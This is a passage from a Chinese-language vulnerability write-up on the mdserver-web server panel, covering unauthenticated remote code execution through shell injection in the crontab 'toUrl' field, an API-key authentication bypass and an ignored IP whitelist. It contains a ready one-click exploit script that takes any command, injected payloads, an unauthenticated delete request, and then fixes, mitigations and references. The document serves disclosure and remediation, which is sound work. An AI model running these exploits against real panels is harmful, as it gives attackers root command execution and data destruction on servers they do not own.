  → {echo: 'a3f1b2c4...', name: 'daily_nginx_check', ...}

removeForCrond('a3f1b2c4...')
  → 从 /var/spool/cron/crontabs/root 移除旧调度行

setCrontabData(1, {stype:'toUrl', url_address:"'; id>/tmp/pwned.txt; echo '", ...})
  → 更新 SQLite

syncToCrond(1) → getShell()
  stype == 'toUrl':
    shell = '...curl -sS ... \'' + "'; id>/tmp/pwned.txt; echo '" + '\''
          = "...curl -sS --connect-timeout 10 -m 60 ''; id>/tmp/pwned.txt; echo ''"
  checkScript(shell) → 黑名单无命中，原样返回
  writeFile('/www/server/cron/a3f1b2c4...', shell)
  chmod 750 /www/server/cron/a3f1b2c4...
```

---

#### Phase 3：无认证立即触发执行（`/crontab/start_task`）

```bash
echo "[*] 触发任务执行..."
resp=$(curl -s -X POST "${TARGET}/crontab/start_task" \
  -d "id=${CRON_ID}")

echo "[*] start_task 响应: ${resp}"
# 预期: {"status": true, "msg": "计划任务【daily_nginx_check】已执行!"}
```

**内部发生了什么**：

```
startTask(1)
  data = getCrond(1)  → {echo: 'a3f1b2c4...', name: '...'}
  cmd_file = '/www/server/cron/a3f1b2c4...'
  os.system('chmod +x /www/server/cron/a3f1b2c4...')
  os.system('nohup /www/server/cron/a3f1b2c4... >> /www/server/cron/a3f1b2c4....log 2>&1 &')
  ↑ 以 root 身份在后台执行已被注入的 Shell 脚本
```

---

#### Phase 4：验证 RCE 结果

```bash
sleep 1  # 等待后台执行完成
echo "[*] 验证 RCE 结果..."
docker exec mdserver-web-vuln cat /tmp/pwned.txt
```

预期输出：

```
uid=0(root) gid=0(root) groups=0(root)
<容器 hostname>
root
```

---

#### 一键自动化利用脚本

```bash
#!/bin/bash
# PoC: mdserver-web ≤0.18.5 无认证 RCE
# 用法: bash poc.sh <target> <command>
# 示例: bash poc.sh http://127.0.0.1:7200 'id>/tmp/pwned.txt'

TARGET="${1:-http://127.0.0.1:7200}"
CMD="${2:-id>/tmp/pwned.txt}"

echo "=== mdserver-web Unauthenticated RCE ==="
echo "[*] Target : ${TARGET}"
echo "[*] Command: ${CMD}"

# Step 1: 枚举有效任务 ID（无认证）
CRON_ID=""
for i in $(seq 1 100); do
  resp=$(curl -s -X POST "${TARGET}/crontab/get_crond_find" -d "id=${i}" 2>/dev/null)
  name=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name','') if d else '')" 2>/dev/null)
  if [ -n "${name}" ]; then
    CRON_ID="${i}"
    echo "[+] Found task: id=${i}, name=${name}"
    break
  fi
done

[ -z "${CRON_ID}" ] && { echo "[-] No tasks found. Exiting."; exit 1; }

# Step 2: 注入 Shell（无认证）
PAYLOAD="'; ${CMD}; echo '"
curl -s -X POST "${TARGET}/crontab/modify_crond" \
  -d "id=${CRON_ID}" \
  -d "name=${name}" \
  -d "type=minute-n" \
  -d "where1=1" \
  -d "stype=toUrl" \
  -d "sname=" -d "sbody=" -d "save=" \
  -d "backup_to=localhost" -d "attr=" \
  --data-urlencode "url_address=${PAYLOAD}" > /dev/null
echo "[+] Payload injected into task id=${CRON_ID}"

# Step 3: 立即触发执行（无认证）
resp=$(curl -s -X POST "${TARGET}/crontab/start_task" -d "id=${CRON_ID}")
echo "[+] Triggered: ${resp}"

echo "[*] Done. Check command output on target."
```

🎉 **仅用两个无认证 POST 请求（`modify_crond` + `start_task`），无需任何账号密码，即可在目标服务器上执行任意命令。**

### PoC 四：无认证删除计划任务（破坏性）

```bash
# 无需认证，直接删除 ID=1 的任务
curl -s -X POST http://127.0.0.1:7200/crontab/del \
  -d "id=1"
```

### PoC 五：认证中间件绕过（需已有 API 凭据）

若攻击者已获得 API 凭据（例如通过社工、配置泄露等），可进一步绕过仍有 `@panel_login_required` 的接口（如 `/crontab/list`、`/crontab/add`）：

```bash
# 首先开启 API 并创建凭据（需先登录面板，或利用其他漏洞）
# 然后用 API Key 绕过 Session 认证
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
```

---

### PoC 六：API Key 认证绕过完整 RCE 利用链

> 此 PoC 适用于面板 API 功能已开启且攻击者持有有效凭据的场景，适用于**所有版本（含 PR #884 修复后）**。

#### 前置步骤：开启 API 并初始化凭据

```bash
# 方式一：登录面板后，进入"设置 → API 管理"，开启并添加应用

# 方式二：在容器内直接通过 Python 初始化（复现环境）
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os, json
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
import thisdb

thisdb.setOption('panel_api', json.dumps({'open': True}))
thisdb.addApp('test_app_id', 'test_app_secret', '0.0.0.0')
print("[+] 面板 API 已开启，凭据: test_app_id / test_app_secret")
print("[+] 注意: IP 白名单 '0.0.0.0' 实际上不会被校验（漏洞④）")
EOF
```

#### Step 1：验证认证绕过

```bash
# 未登录状态下，正常请求被拦截
curl -s -X POST http://127.0.0.1:7200/crontab/list -d "p=1&limit=10"
# → 返回登录页或 4xx

# 携带 API Key → 完全绕过 Session 认证
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
# → 返回 JSON 任务列表，认证绕过成功
```

#### Step 2：通过绕过认证添加恶意任务（`/crontab/add`）

```bash
curl -s -X POST http://127.0.0.1:7200/crontab/add \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "name=api_pwn_task" \
  -d "type=minute-n" \
  -d "where1=1" \
  -d "stype=toUrl" \
  -d "sname=" \
  -d "sbody=" \
  -d "save=" \
  -d "backup_to=localhost" \
  -d "attr=" \
  --data-urlencode "url_address='; id>/tmp/api_pwned.txt; hostname>>/tmp/api_pwned.txt; echo '"
# 预期: {"status": true, "msg": "添加成功"}
```

#### Step 3：获取新任务 ID

```bash
CRON_ID=$(curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10" | python3 -c "
import json, sys
data = json.load(sys.stdin)
tasks = data.get('data', {}).get('data', [])
for t in tasks:
    if t.get('name') == 'api_pwn_task':
        print(t['id']); break
")
echo "[*] 恶意任务 ID: ${CRON_ID}"
```

#### Step 4：立即触发执行

```bash
curl -s -X POST http://127.0.0.1:7200/crontab/start_task \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "id=${CRON_ID}"
# 预期: {"status": true, "msg": "计划任务【api_pwn_task】已执行!"}
```

#### Step 5：验证 RCE

```bash
sleep 1
docker exec mdserver-web-vuln cat /tmp/api_pwned.txt
# 预期: uid=0(root) gid=0(root) groups=0(root)
```

#### Step 6：验证 IP 白名单形同虚设

```bash
# 将白名单设为仅允许 192.168.99.99
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
import core.mw as mw
mw.M('app').where("app_id=?", ('test_app_id',)).update({'white_list': '192.168.99.99'})
print("[+] 白名单已改为 192.168.99.99")
EOF

# 从本机（非 192.168.99.99）发起请求 → 依然成功（白名单从未被校验）
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
# 预期: 仍然返回任务列表，证明 IP 白名单无效
```

---

## 漏洞修复

### 修复一：补全计划任务模块认证（`web/admin/crontab/__init__.py`）

**来自 commit `c508c71f6`（官方实际修复）**，向所有缺少认证的路由补加装饰器：

```python
# 以下 8 个路由均需补加 @panel_login_required

@blueprint.route('/logs', methods=['POST'])
@panel_login_required          # ← 新增
def logs(): ...

@blueprint.route('/del', methods=['POST'])
@panel_login_required          # ← 新增
def crontab_del(): ...

@blueprint.route('/del_logs', methods=['POST'])
@panel_login_required          # ← 新增
def del_logs(): ...

@blueprint.route('/set_cron_status', methods=['POST'])
@panel_login_required          # ← 新增
def set_cron_status(): ...

@blueprint.route('/get_data_list', methods=['POST'])
@panel_login_required          # ← 新增
def get_data_list(): ...

@blueprint.route('/get_crond_find', methods=['POST'])
@panel_login_required          # ← 新增
def get_crond_find(): ...

@blueprint.route('/modify_crond', methods=['POST'])
@panel_login_required          # ← 新增
def modify_crond(): ...

@blueprint.route('/start_task', methods=['POST'])
@panel_login_required          # ← 新增
def start_task(): ...
```

### 修复二：补全网站文档路由认证（`web/admin/site/site_default.py`）

**来自 commit `8586dbbe8`（官方实际修复）**：

```python
@blueprint.route('/get_site_doc', endpoint='get_site_doc', methods=['POST'])
@panel_login_required          # ← 新增
def get_site_doc(): ...
```

### 修复三：完善认证中间件（`web/admin/user_login_check.py`）

```python
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id', '')
        app_secret = request.headers.get('App-Secret', '')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open": False})  # ← 修复①：危险默认值改为 False
            if panel_api['open']:
                info = thisdb.getAppByAppId(app_id)
                if info is None:                               # ← 修复②：空指针检查
                    return Response(status=404)
                if app_secret != info['app_secret']:
                    return Response(status=404)
                # ← 修复③：强制校验 IP 白名单
                white_list = info.get('white_list', '')
                if white_list and white_list != '0.0.0.0':
                    client_ip = mw.getClientIp()
                    allowed_ips = [ip.strip() for ip in white_list.split(',')]
                    if client_ip not in allowed_ips:
                        return Response(status=403)
                return func(*args, **kwargs)

        if not isLogined():
            # ... 原有逻辑不变
        return func(*args, **kwargs)
    return wrapper
```

### 修复四：Shell 注入修复（`web/utils/crontab.py`）

```python
import shlex

if stype == 'toUrl':
    # 修复前（漏洞）：直接字符串拼接
    # shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"

    # 修复后：使用 shlex.quote 进行 Shell 转义
    safe_url = shlex.quote(param['url_address'])
    shell = head + "curl -sS --connect-timeout 10 -m 60 " + safe_url
```

### 修复效果对比

| 攻击向量 | 修复前 | 修复后 |
|---------|--------|--------|
| 无认证访问 `/crontab/modify_crond` | ✅ 直接修改任务 | ❌ 需登录 |
| 无认证访问 `/crontab/start_task` | ✅ 直接触发执行 | ❌ 需登录 |
| 无认证访问 `/crontab/get_data_list` | ✅ 信息泄露 | ❌ 需登录 |
| 无认证访问 `/site/get_site_doc` | ✅ 路径泄露 | ❌ 需登录 |
| 无需 Session 携带 API Key 访问 | ✅ 认证绕过 | ❌ 需有效凭据 |
| 非白名单 IP 使用 API Key | ✅ 访问成功 | ❌ 403 拒绝 |
| `toUrl` 注入 Shell 命令 | ✅ RCE 成功 | ❌ 被转义 |

---

## 漏洞处置

### 受影响版本

| commit | 版本状态 | 说明 |
|--------|---------|------|
| ≤ `33cabc8e2` | ⚠️ 完全受影响 | 计划任务 8 个路由 + `/get_site_doc` 均无认证 |
| `c508c71f6` + `8586dbbe8` | ✅ 路由认证已修复 | PR #884，但认证中间件漏洞仍在 |
| `afdccefa9`（0.18.5） | ⚠️ 部分受影响 | 路由认证已修复，API Key 认证绕过仍在 |

### 临时缓解措施（治标）

在官方全量补丁发布前，**管理员可采取以下措施降低风险**：

1. **防火墙层面隔离**（最有效）：仅允许可信 IP 访问面板端口：
   ```bash
   # 仅允许特定 IP 访问面板
   ufw allow from <trusted_ip> to any port 7200
   ufw deny 7200
   ```

2. **关闭面板 API 功能**（防止 API Key 绕过）：
   ```bash
   docker exec -it mdserver-web-vuln python3 - << 'EOF'
   import sys, os, json
   os.chdir('/www/server/mdserver-web/web')
   sys.path.insert(0, '/www/server/mdserver-web/web')
   import thisdb
   thisdb.setOption('panel_api', json.dumps({'open': False}))
   print("[+] 面板 API 已关闭")
   EOF
   ```

3. **反向代理层添加认证**：在 Nginx/Caddy 前置代理上为面板路径统一添加 HTTP Basic Auth，作为双重保护。

4. **升级至修复版本**：更新到已包含 `c508c71f6` 和 `8586dbbe8` 的版本。

### 永久修复（治本）

```bash
# 停止并清理旧环境
bash docker/vuln/clean.sh

# 拉取已修复代码后重新构建
git pull origin main
bash docker/vuln/start.sh
```

---

## 参考链接

- 项目仓库：[https://github.com/midoks/mdserver-web](https://github.com/midoks/mdserver-web)
- 漏洞分析仓库（含 PoC）：[https://github.com/Mr-xn/mdserver-web](https://github.com/Mr-xn/mdserver-web)
- 关键修复 Commit：
  - `c508c71f6`：[Update __init__.py（计划任务路由补加认证）](https://github.com/midoks/mdserver-web/commit/c508c71f6)
  - `8586dbbe8`：[Update site_default.py（站点文档路由补加认证）](https://github.com/midoks/mdserver-web/commit/8586dbbe8)
- 受影响代码文件：
  - `web/admin/crontab/__init__.py`（8 个未授权路由）
  - `web/admin/site/site_default.py`（1 个未授权路由 + 信息泄露）
  - `web/admin/user_login_check.py`（认证中间件逻辑缺陷）
  - `web/utils/crontab.py`（Shell 注入 RCE）
- Python `shlex` 模块文档：[https://docs.python.org/3/library/shlex.html](https://docs.python.org/3/library/shlex.html)
- OWASP：[Missing Function Level Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)
- OWASP：[OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- CWE-306：[Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- CWE-200：[Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- CWE-78：[Improper Neutralization of Special Elements in OS Command](https://cwe.mitre.org/data/definitions/78.html)
